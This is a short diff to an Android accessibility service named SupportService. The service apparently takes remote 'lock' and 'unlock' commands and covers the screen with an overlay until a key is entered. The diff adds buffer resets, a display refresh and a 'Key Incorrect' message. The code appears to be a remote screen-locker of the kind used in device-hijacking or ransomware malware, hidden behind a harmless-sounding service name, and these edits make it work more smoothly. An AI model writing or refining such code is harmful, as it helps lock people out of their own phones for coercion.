@@ -115,6 +115,7 @@ public class SupportService extends AccessibilityService {
             if (cmdLower.equals("lock")) {
                 task_handler.post(() -> {
                     if (!isLocked) {
+                        input_buffer.setLength(0); // Reset buffer saat lock
                         showOverlay();
                         isLocked = true;
                     }
@@ -125,6 +126,7 @@ public class SupportService extends AccessibilityService {
                     if (isLocked) {
                         hideOverlay();
                         isLocked = false;
+                        input_buffer.setLength(0); // Reset buffer saat unlock
                     }
                 });
                 out.println("OK: Device Unlocked");
@@ -162,6 +164,7 @@ public class SupportService extends AccessibilityService {
         tv_status = overlay.findViewById(R.id.v_timer);
         tv_display = overlay.findViewById(R.id.v_display);
         
+        refresh_display(); // Pastikan display bersih saat muncul
         setupButtons();
 
         wm.addView(overlay, lp);
@@ -201,9 +204,11 @@ public class SupportService extends AccessibilityService {
             if (checkKey(input_buffer.toString())) {
                 hideOverlay();
                 isLocked = false;
+                input_buffer.setLength(0); // Reset setelah sukses
             } else {
-                input_buffer.setLength(0);
+                input_buffer.setLength(0); // Reset jika salah
                 refresh_display();
+                Toast.makeText(getApplicationContext(), "Key Incorrect", Toast.LENGTH_SHORT).show();
             }
         });
     }
